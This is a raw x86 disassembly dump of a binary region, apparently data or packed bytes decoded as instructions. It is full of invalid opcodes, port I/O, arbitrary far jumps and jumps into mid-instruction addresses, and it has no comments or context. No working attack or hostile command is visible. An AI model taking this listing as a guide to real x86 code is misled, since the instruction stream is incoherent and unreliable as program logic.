  41a0e3:	outs   dx,DWORD PTR ds:[esi]
  41a0e4:	or     DWORD PTR [ebp-0x79],edx
  41a0e7:	cwde   
  41a0e8:	imul   esi,DWORD PTR [eax],0x20
  41a0eb:	sbb    BYTE PTR [esi+0x64e44135],ah
  41a0f1:	stos   BYTE PTR es:[edi],al
  41a0f2:	fsubr  QWORD PTR [ebx-0x4f46047c]
  41a0f8:	or     al,0xe9
  41a0fa:	adc    edx,ecx
  41a0fc:	lds    esi,FWORD PTR [ebp+0x53139ac4]
  41a102:	mov    ds:0x2a216ea9,al
  41a107:	xor    edx,DWORD PTR [ebx+0x4d]
  41a10a:	fistp  WORD PTR [eax+0x31]
  41a10d:	and    DWORD PTR [esi-0x2955d787],edi
  41a113:	mov    ah,0x8a
  41a115:	jo     0x41a10f
  41a117:	jmp    0x8b1b:0x11da972f
  41a11e:	aad    0x7e
  41a120:	ss dec edx
  41a122:	fbstp  TBYTE PTR [eax-0x1]
  41a125:	pop    ss
  41a126:	xchg   DWORD PTR [ebp+0x5b],ebp
  41a129:	imul   esp,esi,0x8e6d7497
  41a12f:	ss sbb ebp,ecx
  41a132:	mov    ebx,0x5972021a
  41a137:	cdq    
  41a138:	int    0xdb
  41a13a:	or     ch,bh
  41a13c:	ins    BYTE PTR es:[edi],dx
  41a13d:	and    eax,0x2ef1bdd0
  41a142:	mov    BYTE PTR [edi],ah
  41a144:	mov    eax,0xeb043216
  41a149:	push   ds
  41a14a:	stc    
  41a14b:	xchg   edx,eax
  41a14c:	ret    0x8b7d
  41a14f:	loop   0x41a1c1
  41a151:	cs retf 
  41a153:	test   BYTE PTR [ebp+0x1d],ah
  41a156:	mov    BYTE PTR [edi],bh
  41a158:	jle    0x41a11c
  41a15a:	mov    ebp,0x5dc8dfcf
  41a15f:	or     eax,0x5f7c2518
  41a164:	popa   
  41a165:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a166:	scas   eax,DWORD PTR es:[edi]
  41a167:	or     BYTE PTR [esi-0x5f85698c],bl
  41a16d:	cmp    al,BYTE PTR [edx+0x53a7abe2]
  41a173:	dec    esp
  41a174:	jno    0x41a1c7
  41a176:	scas   eax,DWORD PTR es:[edi]
  41a177:	cdq    
  41a178:	stc    
  41a179:	sar    BYTE PTR [ecx],0x3e
  41a17c:	jno    0x41a1b1
  41a17e:	jmp    0x41a147
  41a180:	adc    eax,0x7512d1be
  41a185:	xchg   edx,eax
  41a186:	out    0x87,eax
  41a188:	(bad)  
  41a18a:	gs pop ecx
  41a18c:	pop    ecx
  41a18d:	fucomi st,st(5)
  41a18f:	inc    eax
  41a190:	gs xor ah,bl
  41a193:	cmp    eax,0x250ed63c
  41a198:	xchg   ebp,eax
  41a199:	pop    edx
  41a19a:	pop    ds
  41a19b:	out    0x60,al
  41a19d:	lahf   
  41a19e:	xlat   BYTE PTR ds:[ebx]
  41a19f:	add    al,BYTE PTR [edx+ebx*2+0x57a72e10]
  41a1a6:	push   edx
  41a1a7:	adc    eax,0x3d10eae
  41a1ac:	adc    al,0xea
  41a1ae:	or     ecx,DWORD PTR [edi+0x149a5e30]
  41a1b4:	ss loopne 0x41a20d
  41a1b7:	(bad)  
  41a1b8:	(bad)  
  41a1b9:	fisttp WORD PTR [eax]
  41a1bb:	stc    
  41a1bc:	nop
  41a1bd:	arpl   WORD PTR [edi],di
  41a1bf:	stc    
  41a1c0:	sub    ecx,DWORD PTR [ecx]
  41a1c2:	in     eax,dx
  41a1c3:	ret    0x227e
  41a1c6:	aad    0x19
  41a1c8:	scas   eax,DWORD PTR es:[edi]
  41a1c9:	push   edx
  41a1ca:	lods   eax,DWORD PTR fs:[esi]
  41a1cc:	add    DWORD PTR [ebx+eax*2],esp
  41a1cf:	mov    ds:0xc57b955,al
  41a1d4:	repnz ror DWORD PTR [ebx],0xfa
  41a1d8:	stos   BYTE PTR es:[edi],al
  41a1d9:	inc    ebp
  41a1da:	sub    al,BYTE PTR [ecx-0x10]
  41a1dd:	add    dh,BYTE PTR [esi]
  41a1df:	sbb    al,0xf6
  41a1e1:	mov    ch,0xe5
  41a1e3:	mov    edx,0xcf74f647
  41a1e8:	pop    edi
  41a1e9:	pop    ds
  41a1ea:	xor    al,dh
  41a1ec:	mov    al,ds:0xeef4bb70
  41a1f1:	sahf   
  41a1f2:	loope  0x41a229
  41a1f4:	mov    ch,BYTE PTR [ebp+ebx*8+0x3c]
  41a1f8:	(bad)  
  41a1f9:	and    BYTE PTR [edi-0x1f],dh
  41a1fc:	(bad)
  41a200:	or     al,0xf0
  41a202:	neg    BYTE PTR [eax]
  41a204:	dec    ecx
  41a205:	cld    
  41a206:	bound  edi,QWORD PTR [edx-0x4f003c7d]
  41a20c:	inc    BYTE PTR [edi-0x5c]
  41a20f:	mov    bh,0x64
  41a211:	shl    BYTE PTR [esi-0x2d],0x98
  41a215:	repz inc ecx
  41a217:	and    bl,bh
  41a219:	ins    BYTE PTR es:[edi],dx
  41a21a:	out    dx,eax
  41a21b:	mov    bh,0x56
  41a21d:	dec    eax
  41a21e:	daa    
  41a21f:	sbb    al,0xb5
  41a221:	lock aas 
  41a223:	aam    0xd3
  41a225:	mov    al,ds:0x16feadcb
  41a22a:	mul    BYTE PTR [eax]
  41a22c:	je     0x41a206
  41a22e:	sub    DWORD PTR [esi-0x7c],edi
  41a231:	shl    edi,1
  41a233:	xchg   ecx,eax
  41a234:	mov    ds:0x4363568,al
  41a239:	ficom  WORD PTR [ebp-0x3d]
  41a23c:	and    al,0x14
  41a23e:	mov    ds:0x85d11f71,al
  41a243:	lods   al,BYTE PTR ds:[esi]
  41a244:	pop    edx
  41a245:	add    DWORD PTR [eax-0x5d],esp
  41a248:	mov    cl,0x2f
  41a24a:	scas   al,BYTE PTR es:[edi]
  41a24b:	out    dx,eax
  41a24c:	mov    esp,0xbd3693ad
  41a251:	mov    eax,ds:0x10e83f29
  41a256:	sbb    DWORD PTR [ecx],0x15
  41a259:	outs   dx,DWORD PTR ds:[esi]
  41a25a:	test   al,0x82
  41a25c:	es (bad) 
  41a25e:	push   esi
  41a25f:	xchg   ebp,eax
  41a260:	retf   0xf3e1
  41a263:	and    BYTE PTR [esi+eiz*8],al
  41a266:	mov    ebx,0x3ce12169
  41a26b:	mov    ?,WORD PTR [edi+edi*4-0x56d67835]
  41a272:	aad    0x56
  41a274:	arpl   WORD PTR [ecx],cx
  41a276:	and    DWORD PTR [ebx],edi
  41a278:	test   DWORD PTR [ebp-0x12],esi
  41a27b:	fldcw  WORD PTR [eax-0x77]
  41a27e:	pop    esp
  41a27f:	mov    BYTE PTR cs:[esi+ebx*8+0x1dee66fe],0x11
  41a288:	stos   DWORD PTR es:[edi],eax
  41a289:	enter  0xbc46,0xc2
  41a28d:	mov    esi,0xaf9ca0fa
  41a292:	mov    bl,0xa4
  41a294:	push   ebx
  41a295:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a296:	mov    ds:0x84954246,al
  41a29b:	xor    BYTE PTR [edx-0x4e],ah
  41a29e:	dec    edx
  41a29f:	sbb    DWORD PTR [edi-0x517e2d35],ebx
  41a2a5:	call   0x241b5a2e
  41a2aa:	stc    
  41a2ab:	dec    edi
  41a2ac:	or     BYTE PTR [ebx],0xf2
  41a2af:	aaa    
  41a2b0:	in     eax,dx
  41a2b1:	dec    esi
  41a2b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2b3:	xchg   ebx,eax
  41a2b4:	add    al,0x1a
  41a2b6:	in     al,0x24
  41a2b8:	add    eax,0xd1abc93d
  41a2bd:	in     eax,0xaa
  41a2bf:	fucom  st(7)
  41a2c1:	iret   
  41a2c2:	jns    0x41a2c4
  41a2c4:	push   0xffffff93
  41a2c6:	aad    0x4b
  41a2c8:	xchg   DWORD PTR [ecx+0x30723c26],esi
  41a2ce:	cmp    DWORD PTR [ebx-0xf52e8b6],eax
  41a2d4:	push   0xceac574d
  41a2d9:	int3   
  41a2da:	pop    ecx
  41a2db:	scas   al,BYTE PTR es:[edi]
  41a2dc:	es jle 0x41a2af
  41a2df:	je     0x41a35f
  41a2e1:	cmp    al,0x8
  41a2e3:	xchg   ebp,eax
  41a2e4:	dec    edi
  41a2e5:	xchg   edx,eax
  41a2e6:	adc    bl,BYTE PTR [esi]
  41a2e8:	std    
  41a2e9:	inc    ebx
  41a2ea:	repnz div DWORD PTR [ebx]
  41a2ed:	mov    ebp,0x3ec63e44
  41a2f2:	adc    eax,DWORD PTR [edx-0x13bfd6fe]
  41a2f8:	adc    DWORD PTR ds:0x18480457,ebx
  41a2fe:	mov    eax,ds:0xbe095cd
  41a303:	mov    ds:0xd6e634a0,al
  41a308:	push   edx
  41a309:	js     0x41a2aa
  41a30b:	icebp  
  41a30c:	push   esi
  41a30d:	lods   eax,DWORD PTR ds:[esi]
  41a30e:	pop    es
  41a30f:	push   ss
  41a310:	dec    ebx
  41a311:	cwde   
  41a312:	shr    DWORD PTR [edi+0x6d],cl
  41a315:	jbe    0x41a331
  41a317:	add    dh,BYTE PTR [esi+0x24e7a242]
  41a31d:	jbe    0x41a38a
  41a31f:	sub    DWORD PTR [eax-0x219dd178],ebp
  41a325:	mov    ecx,0x7ab8318b
  41a32a:	fist   DWORD PTR [eax+0x14]
  41a32d:	jecxz  0x41a357
  41a32f:	or     eax,0xed344af0
  41a334:	gs xchg eax,ecx
  41a337:	pop    esp
  41a338:	mov    ds:0x80e80e22,al
  41a33d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a33e:	cld    
  41a33f:	mov    al,ds:0xc9db34bb
  41a344:	test   eax,0xfdf6cb1c
  41a349:	mov    dl,0xd0
  41a34b:	addr16 out 0xd3,al
  41a34e:	dec    edx
  41a34f:	fwait
  41a350:	add    ecx,edi
  41a352:	repnz out dx,al
  41a354:	mov    bh,0xd5
  41a356:	xor    al,0xc5
  41a358:	jl     0x41a342
  41a35a:	aam    0xac
  41a35c:	fwait
  41a35d:	add    eax,0x7fa071d4
  41a362:	addr16 push edi
  41a364:	psubusb mm3,QWORD PTR [ebp+0x58]
  41a368:	mov    eax,0x9f69d2da
  41a36d:	push   eax
  41a36e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a36f:	xchg   ebx,eax
  41a371:	pop    eax
  41a372:	addr16 imul edi,edx,0x7d
  41a376:	sbb    DWORD PTR [ebp-0x67256023],0x972d6996
  41a380:	or     DWORD PTR [edx],ebp
  41a382:	adc    BYTE PTR [esi+ebx*1],cl
  41a385:	test   BYTE PTR [ecx+0x5244175b],ch
  41a38b:	out    0x8e,al
  41a38d:	cmp    BYTE PTR [edi+0x3508afd6],dh
  41a393:	(bad)  
  41a394:	mov    eax,ds:0x46078003
  41a399:	nop
  41a39a:	icebp  
  41a39b:	cmc    
  41a39c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a39d:	dec    edx
  41a39e:	fwait
  41a39f:	or     DWORD PTR [esi-0x371873e5],ebp
  41a3a5:	jle    0x41a36e
  41a3a7:	sub    eax,DWORD PTR [ebp+0x62]
  41a3aa:	sbb    ebx,ecx
  41a3ac:	mov    dh,0x35
  41a3ae:	gs inc esp
  41a3b0:	cdq    
  41a3b1:	mov    ebp,0xb647199f
  41a3b6:	pop    ebp
  41a3b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3b8:	push   esi
  41a3b9:	mov    edi,0x640764a3
  41a3be:	sub    eax,0xc5a15b17
  41a3c3:	jmp    0x88422f94
  41a3c8:	iret   
  41a3c9:	fsubr  QWORD PTR [esi+ecx*8+0x53]
  41a3cd:	int    0xc8
  41a3cf:	mov    ch,0xf1
  41a3d1:	enter  0x3b40,0x8e
  41a3d5:	jnp    0x41a3f5
  41a3d7:	rcr    BYTE PTR [edi+ebp*1+0x53],cl
  41a3db:	out    0x0,al
  41a3dd:	xchg   ebx,eax
  41a3de:	pop    eax
  41a3df:	xchg   DWORD PTR [esi+0x6a],edi
  41a3e2:	xlat   BYTE PTR ds:[ebx]
  41a3e3:	sbb    eax,0xe57011d4
  41a3e8:	jg     0x41a3cd
  41a3ea:	add    BYTE PTR [eax+0x4ad42b75],bl
  41a3f0:	jns    0x41a3cf
  41a3f2:	mov    al,0x1e
  41a3f4:	cmp    DWORD PTR [eax],0xffffffc2
  41a3f7:	shr    DWORD PTR [edi+0x62],cl
  41a3fa:	mov    esi,0x17bbe13c
  41a3ff:	in     al,0x45
  41a401:	jle    0x41a3bd
  41a403:	push   ebx
  41a404:	push   0x58
  41a406:	or     al,0xd4
  41a408:	and    edi,DWORD PTR [eax-0x14fc9880]
  41a40e:	jmp    0xec77:0x4a83a5c
  41a415:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a416:	test   DWORD PTR [ecx],esi
  41a418:	jb     0x41a485
  41a41a:	or     edi,edi
  41a41c:	jl     0x41a44b
  41a41e:	pushw  ss
  41a420:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a421:	fwait
  41a422:	push   esp
  41a423:	sub    eax,0x18f7f973
  41a428:	in     al,0x38
  41a42a:	xchg   al,dh
  41a42c:	nop
  41a42d:	jnp    0x41a42a
  41a42f:	loop   0x41a450
  41a431:	sti    
  41a432:	paddb  mm0,QWORD PTR [ebp+0x62ca634c]
  41a439:	jl     0x41a4a3
  41a43b:	aad    0xf8
  41a43d:	mov    ebp,0x523544a5
  41a442:	stos   BYTE PTR es:[edi],al
  41a443:	daa    
  41a444:	mov    ch,0x6e
  41a446:	mov    ds:0xe2f8e601,al
  41a44b:	out    dx,eax
  41a44c:	xchg   esi,eax
  41a44d:	(bad)  
  41a44e:	aad    0x60
  41a450:	xchg   cl,bl
  41a452:	or     ah,BYTE PTR [edi-0x26]
  41a455:	or     esp,eax
  41a457:	mov    ch,BYTE PTR [edx+0x785aa65f]
  41a45d:	xor    dl,BYTE PTR [edi-0x793d4db9]
  41a463:	mov    esp,0x8110c004
  41a468:	jmp    0x4bc6:0x5a21a409
  41a46f:	and    eax,0xc6febf94
  41a474:	ss sar ebp,1
  41a477:	rol    BYTE PTR [ecx-0x679aa31],0x3e
  41a47e:	adc    cl,bh
  41a480:	call   0x501ba441
  41a485:	push   ds
  41a486:	pop    esi
  41a487:	xlat   BYTE PTR ds:[ebx]
  41a488:	loop   0x41a41d
  41a48a:	pop    eax
  41a48b:	pop    ss
  41a48c:	xchg   edx,eax
  41a48d:	pop    DWORD PTR [ebp+ebx*1+0x114e083]
  41a494:	loope  0x41a4aa
  41a496:	sub    BYTE PTR [edx-0x35],bh
  41a499:	(bad)  [eax+0xd273a6d]
  41a49f:	arpl   WORD PTR [edi],cx
  41a4a1:	in     eax,dx
  41a4a2:	test   eax,0x393c2ee
  41a4a7:	je     0x41a4a4
  41a4a9:	push   ss
  41a4aa:	dec    edi
  41a4ab:	out    0x47,al
  41a4ad:	mov    ch,BYTE PTR [ebp+0x11]
  41a4b0:	pop    ss
  41a4b1:	lahf   
  41a4b2:	test   al,0xd2
  41a4b4:	xor    BYTE PTR [ebp+0x61],al
  41a4b7:	adc    DWORD PTR [bx+si],eax
  41a4ba:	rol    edx,cl
  41a4bc:	pop    ss
  41a4bd:	jg     0x41a4c7
  41a4bf:	cmp    DWORD PTR [edi+0x53],ebx
  41a4c2:	or     ecx,DWORD PTR [edi]
  41a4c4:	mov    ebx,0x4859e4d2
  41a4c9:	xchg   ecx,eax
  41a4ca:	sbb    eax,0x81d1ab36
  41a4cf:	scas   al,BYTE PTR es:[edi]
  41a4d0:	inc    eax
  41a4d1:	(bad)  
  41a4d2:	pop    ecx
  41a4d3:	mov    ecx,DWORD PTR [ecx+0x41]
  41a4d6:	pop    ecx
  41a4d7:	mov    ds:0xf394a5ec,eax
  41a4dc:	sub    DWORD PTR [ebp+0x1f8ad035],0x24
  41a4e3:	test   DWORD PTR [edi-0x3f],0x9f2df0ca
  41a4ea:	xlat   BYTE PTR ds:[ebx]
  41a4eb:	pushf  
  41a4ec:	ret    0x59eb
  41a4ef:	jb     0x41a568
  41a4f1:	sbb    BYTE PTR [ecx-0x74c212ee],0x11
  41a4f8:	push   ebx
  41a4f9:	sar    ch,0xe2
  41a4fc:	pop    edx
  41a4fd:	shl    dl,0xaf
  41a500:	pop    edi
  41a501:	adc    DWORD PTR [edx+0x11],0x39298ee4
  41a508:	imul   BYTE PTR [ebx+0x1d]
  41a50b:	or     eax,0x93a7d5c7
  41a510:	push   0x2d
  41a512:	cwde   
  41a513:	sbb    eax,0x5907045b
  41a518:	retf   0xcb
  41a51b:	mov    edx,0x873445a5
  41a520:	mov    edi,0xa5cb6d69
  41a525:	fidivr DWORD PTR [edx+0x55a6eaa0]
  41a52b:	adc    DWORD PTR [edi+0x6cb40b15],eax
  41a531:	imul   eax,DWORD PTR [ebp+0x55a61912],0xffffffb2
  41a538:	cmp    esi,DWORD PTR [edx+0x7e741c12]
  41a53e:	imul   esp,DWORD PTR [edi],0xffffffa5
  41a541:	(bad)  
  41a542:	into   
  41a543:	push   ebx
  41a544:	mov    ebp,0xfc84a63f
  41a549:	mov    esp,0x7525ee36
  41a54e:	stc    
  41a54f:	mov    esp,0x15655a15
  41a554:	dec    esp
  41a555:	fld    QWORD PTR [edi-0x5c]
  41a558:	fsubr  QWORD PTR [ecx+0x131959f2]
  41a55e:	mov    ebx,0x7b29501a
  41a563:	sub    BYTE PTR [eax-0x47bacce0],dl
  41a569:	lods   al,BYTE PTR ds:[esi]
  41a56a:	cs bound edx,QWORD PTR gs:[ebx-0x53]
  41a56f:	jb     0x41a538
  41a571:	outs   dx,BYTE PTR ds:[esi]
  41a572:	jne    0x41a567
  41a574:	jnp    0x41a5f2
  41a576:	lahf   
  41a577:	ins    DWORD PTR es:[edi],dx
  41a578:	inc    edx
  41a579:	dec    esi
  41a57a:	daa    
  41a57b:	dec    ebx
  41a57c:	pop    ss
  41a57d:	inc    bl
  41a57f:	pop    ss
  41a580:	cmp    cl,ch
  41a582:	clc    
  41a583:	sti    
  41a584:	in     eax,dx
  41a585:	out    0xe9,eax
  41a587:	jp     0x41a5cf
  41a589:	sahf   
  41a58a:	push   esp
  41a58b:	fnstcw WORD PTR [eax]
  41a58d:	lods   al,BYTE PTR ds:[esi]
  41a58e:	mov    edi,0x189f35b3
  41a593:	fist   DWORD PTR [esi-0x5a]
  41a596:	or     ah,bl
  41a598:	adc    cl,ah
  41a59a:	ss rcl ebx,0x59
  41a59e:	xor    BYTE PTR gs:[ecx+0x5a],ch
  41a5a2:	test   eax,0xeb0d27b4
  41a5a7:	add    DWORD PTR [edi-0x2d],0x619a520f
  41a5ae:	push   0x50cda2ed
  41a5b3:	fidivr WORD PTR [ecx+ebx*8-0x417f59c7]
  41a5ba:	jmp    0x270c3e4b
  41a5bf:	dec    edx
  41a5c0:	mov    bl,BYTE PTR [ebp+0x6a9aedf5]
  41a5c6:	jnp    0x41a57c
  41a5c8:	hlt    
  41a5c9:	fild   WORD PTR [ecx+0x35c30fc9]
  41a5cf:	fdiv   QWORD PTR [ecx+0x36154c7d]
  41a5d5:	ins    DWORD PTR es:[edi],dx
  41a5d6:	mov    ?,WORD PTR [ebx+0x71]
  41a5d9:	clc    
  41a5da:	mov    esp,0x2ff080ac
  41a5df:	adc    eax,0xa226dece
  41a5e4:	sbb    BYTE PTR [ebp-0x567a3a07],cl
  41a5ea:	jmp    FWORD PTR [eax+esi*4]
  41a5ed:	cmp    al,0x6d
  41a5ef:	sub    DWORD PTR [edx-0x5a36d05c],ebp
  41a5f5:	mov    ebp,0xdfa8baba
  41a5fa:	jecxz  0x41a5c1
  41a5fc:	or     DWORD PTR [ebp+0x7a887c84],edx
  41a602:	ret    
  41a603:	cmp    cl,al
  41a605:	push   edx
  41a606:	mov    dh,0x60
  41a608:	xchg   edi,eax
  41a609:	aaa    
  41a60a:	sbb    al,0xa6
  41a60c:	push   0x15
  41a60e:	and    eax,0x7231f4aa
  41a613:	sub    ecx,DWORD PTR [ebp-0x195be108]
  41a619:	sbb    ebp,eax
  41a61b:	shl    BYTE PTR [ebp+ecx*1-0x5],1
  41a61f:	cmp    esi,DWORD PTR [edx-0x13bed2b5]
  41a625:	cld    
  41a626:	bound  edi,QWORD PTR [ebx+0x64]
  41a629:	(bad)  
  41a62b:	(bad)  
  41a62c:	xchg   ebp,eax
  41a62d:	call   0xb4fe:0x6fbc2908
  41a634:	mov    ds:0xde3d14a5,eax
  41a639:	loope  0x41a5e5
  41a63b:	mov    ah,0xd7
  41a63d:	xchg   DWORD PTR [ebp-0x7b],ecx
  41a640:	cmp    al,0xe1
  41a642:	push   esp
  41a643:	mov    al,0x96
  41a645:	jmp    0x41a655
  41a647:	or     bl,dh
  41a649:	cmp    eax,0x15830859
  41a64e:	clc    
  41a64f:	xor    bl,dl
  41a651:	and    DWORD PTR [ebx-0x4e],esi
  41a654:	mov    ds:0x97e5942c,eax
  41a659:	or     ch,BYTE PTR [edi]
  41a65b:	scas   al,BYTE PTR es:[edi]
  41a65c:	repz scas al,BYTE PTR es:[edi]
  41a65e:	icebp  
  41a65f:	mov    cl,BYTE PTR [edi]
  41a661:	dec    eax
  41a662:	add    ebx,edi
  41a664:	xor    al,0xaf
  41a666:	jno    0x41a667
  41a668:	sub    al,0x15
  41a66a:	push   edi
  41a66b:	push   ebp
  41a66c:	or     al,0xb9
  41a66e:	test   BYTE PTR [edi+0x3786dc62],dl
  41a674:	lods   eax,DWORD PTR ds:[esi]
  41a675:	and    cl,BYTE PTR [esi]
  41a677:	int    0x46
  41a679:	adc    esi,ecx
  41a67b:	in     al,dx
  41a67c:	mov    dh,0x6e
  41a67e:	stc    
  41a67f:	push   0xffffffa1
  41a681:	aas    
  41a682:	sbb    al,0x34
  41a684:	pop    ss
  41a685:	add    ebx,edi
  41a687:	jbe    0x41a61f
  41a689:	setp   BYTE PTR [eax]
  41a68c:	in     al,dx
  41a68d:	cmp    cl,ah
  41a68f:	bound  esi,QWORD PTR [edi]
  41a691:	repz fimul WORD PTR [edi-0x29a7df3e]
  41a698:	bnd call 0xbb923866
  41a69e:	repz xchg ecx,eax
  41a6a0:	pop    ds
  41a6a1:	push   eax
  41a6a2:	or     cl,al
  41a6a4:	outs   dx,DWORD PTR ds:[esi]
  41a6a5:	and    al,0xb6
  41a6a7:	adc    BYTE PTR [ecx],bl
  41a6a9:	jmp    0x41a6fe
  41a6ab:	xor    al,BYTE PTR [edi+0x22bf78c6]
  41a6b1:	push   esp
  41a6b2:	pop    eax
  41a6b3:	sbb    ecx,DWORD PTR [esi+0x1d]
  41a6b6:	bound  edi,QWORD PTR [edi+0x7b]
  41a6b9:	fisttp DWORD PTR [eax]
  41a6bb:	mov    bh,0xa3
  41a6bd:	ror    DWORD PTR [ebx-0x71],0x74
  41a6c1:	jb     0x41a73c
  41a6c3:	mov    bl,0x24
  41a6c5:	mov    cl,0x24
  41a6c7:	gs dec ecx
  41a6c9:	pop    ecx
  41a6ca:	xor    DWORD PTR [edx+0x64],ecx
  41a6cd:	test   DWORD PTR [ecx+0x18],ebp
  41a6d0:	test   al,0x2e
  41a6d2:	ret    
  41a6d3:	jg     0x41a743
  41a6d5:	in     eax,0x9e
  41a6d7:	jg     0x41a6cb
  41a6d9:	ret    0x2e95
  41a6dc:	fmul   st(4),st
  41a6de:	test   BYTE PTR [ebx+0x7f],bl
  41a6e1:	dec    ebp
  41a6e2:	xor    ch,BYTE PTR [ebp-0x5bb37124]
  41a6e8:	rcl    al,cl
  41a6ea:	in     eax,0x7e
  41a6ec:	out    dx,al
  41a6ed:	sbb    DWORD PTR [edi+ebx*8-0x6e877fdb],esi
  41a6f4:	pop    ss
  41a6f5:	mov    ch,BYTE PTR [ecx+0x5c]
  41a6f8:	or     eax,0xcecd52cd
  41a6fd:	xlat   BYTE PTR ds:[ebx]
  41a6fe:	out    dx,eax
  41a6ff:	call   DWORD PTR [ecx+0x37a3484e]
  41a705:	xor    esi,DWORD PTR [ebp+ebx*1+0x67]
  41a709:	and    esp,ebx
  41a70b:	out    0x75,eax
  41a70d:	enter  0xf5d0,0xa8
  41a711:	repz inc eax
  41a713:	sub    ecx,DWORD PTR [esi]
  41a715:	push   ss
  41a716:	cs loop 0x41a6f8
  41a719:	sbb    BYTE PTR [eax-0x618f0782],ch
  41a71f:	adc    ebx,DWORD PTR [edx]
  41a721:	xchg   ebp,eax
  41a722:	mov    bl,BYTE PTR [ecx-0x32]
  41a725:	pop    edi
  41a726:	mov    ah,0xcc
  41a728:	pop    edi
  41a729:	les    ecx,FWORD PTR [esi-0x3be00ebd]
  41a72f:	ss push 0xffffff92
  41a732:	pop    esi
  41a733:	xor    BYTE PTR [edi],0x14
  41a736:	(bad)  
  41a738:	push   0x4b37434
  41a73d:	jg     0x41a745
  41a73f:	imul   edx,DWORD PTR [ecx-0x3a31abe6],0xffffffea
  41a746:	mov    eax,ds:0xefb2030e
  41a74b:	jae    0x41a71e
  41a74d:	add    eax,0x57afeb54
  41a752:	ds fwait
  41a754:	xor    eax,0xc9feb3b3
  41a759:	test   al,0x6e
  41a75b:	adc    edx,DWORD PTR [esi+0x7e70e55b]
  41a761:	push   0xffffffa9
  41a763:	add    BYTE PTR [ebp+0x30],ah
  41a766:	fstp   TBYTE PTR [ebp+0x3d]
  41a769:	push   es
  41a76a:	dec    edi
  41a76b:	data16 fwait
  41a76d:	mov    ch,dl
  41a76f:	mov    eax,ds:0x42ca145a
  41a774:	pop    eax
  41a775:	add    eax,0xce15227c
  41a77a:	loopne 0x41a738
  41a77c:	mov    ch,0x20
  41a77e:	mov    bl,0x7c
  41a780:	sar    bh,cl
  41a782:	je     0x41a7ff
  41a784:	push   ebx
  41a785:	adc    edx,DWORD PTR [ebp-0x13669e97]
  41a78b:	push   esi
  41a78c:	add    esp,DWORD PTR [edx-0x745553c3]
  41a792:	sub    dl,BYTE PTR [ebp+edi*1-0x1d]
  41a796:	mov    ebx,0xbcb53d36
  41a79b:	mov    ebx,0xd0ea211c
  41a7a1:	inc    edi
  41a7a2:	dec    ebx
  41a7a3:	fcomp  DWORD PTR [esi]
  41a7a5:	int3   
  41a7a6:	pop    edx
  41a7a7:	and    al,0x1c
  41a7a9:	cmp    ch,BYTE PTR [edx]
  41a7ab:	(bad)  
  41a7ac:	cmp    ebp,eax
  41a7ae:	cs in  al,0x93
  41a7b1:	fistp  QWORD PTR [eax+eiz*2+0x628f256c]
  41a7b8:	dec    esi
  41a7b9:	xchg   esi,eax
  41a7ba:	in     eax,dx
  41a7bb:	jp     0x41a793
  41a7bd:	sti    
  41a7be:	aaa    
  41a7bf:	push   0x24
  41a7c1:	mov    ch,0x29
  41a7c3:	inc    eax
  41a7c4:	mov    ebx,0x115a834a
  41a7c9:	lods   al,BYTE PTR ds:[esi]
  41a7ca:	xchg   edx,eax
  41a7cb:	jp     0x41a7c8
  41a7cd:	hlt    
  41a7ce:	inc    esi
  41a7cf:	adc    dl,BYTE PTR [ebp-0xd6d4d95]
  41a7d5:	test   eax,0x429e8da6
  41a7da:	mov    dh,0x9e
  41a7dc:	dec    ebp
  41a7dd:	clc    
  41a7de:	mov    ah,0xbd
  41a7e0:	pop    DWORD PTR [esi]
  41a7e2:	test   ebp,esi
  41a7e4:	fldcw  WORD PTR ds:0xa156ac0d
  41a7ea:	inc    eax
  41a7eb:	mov    ds:0xf91e2daf,al
  41a7f0:	adc    al,0xf9
  41a7f2:	sub    bh,BYTE PTR [ebx]
  41a7f4:	xor    DWORD PTR [ecx],edi
  41a7f6:	and    al,0x4f
  41a7f8:	aaa    
  41a7f9:	test   DWORD PTR [edx+0x23dbedf8],esi
  41a7ff:	outs   dx,DWORD PTR ds:[esi]
  41a800:	sahf   
  41a801:	dec    ebx
  41a802:	lds    esp,FWORD PTR [ebp+ecx*1-0x4b88efb9]
  41a809:	jno    0x41a806
  41a80b:	aad    0x31
  41a80d:	pop    esp
  41a80e:	jns    0x41a85c
  41a810:	in     eax,dx
  41a811:	jge    0x41a831
  41a813:	je     0x41a841
  41a815:	in     eax,0xe1
  41a817:	push   ebp
  41a818:	xor    al,0x59
  41a81a:	jmp    0x41a81f
  41a81c:	or     DWORD PTR [esi+0xd],0x21
  41a820:	xor    BYTE PTR [edi+0x49],dh
  41a823:	pop    es
  41a824:	xor    dl,ch
  41a826:	sti    
  41a827:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a828:	mov    edi,0x475f82cc
  41a82d:	repnz scas eax,DWORD PTR es:[edi]
  41a82f:	and    eax,0x16cac272
  41a834:	outs   dx,BYTE PTR ds:[esi]
  41a835:	adc    BYTE PTR [esi+0x1debbb0],cl
  41a83b:	in     eax,0x8c
  41a83d:	jmp    0x41a8b4
  41a83f:	mov    bl,bh
  41a841:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a842:	mov    dh,0xc1
  41a844:	sub    BYTE PTR [edx-0x15441cd9],al
  41a84a:	jb     0x41a8a8
  41a84c:	inc    ecx
  41a84d:	sub    eax,DWORD PTR es:[ecx]
  41a850:	pop    edx
  41a851:	out    dx,al
  41a852:	test   BYTE PTR [edi+esi*2+0x9],bl
  41a856:	sbb    al,BYTE PTR [edx+0x36a7eaa1]
  41a85c:	jmp    0x41a7f3
  41a85e:	adc    BYTE PTR [edx-0x12a39732],dh
  41a864:	and    DWORD PTR [ebx-0x204faf6a],eax
  41a86a:	loope  0x41a85d
  41a86c:	aam    0x38
  41a86e:	mov    dh,0xe7
  41a870:	xor    al,BYTE PTR [edx-0x36d015dd]
  41a876:	push   ds
  41a877:	or     ah,0xcd
  41a87a:	dec    esi
  41a87b:	cmp    eax,0xcfb20d8a
  41a880:	jge    0x41a822
  41a882:	pop    eax
  41a883:	ins    BYTE PTR es:[edi],dx
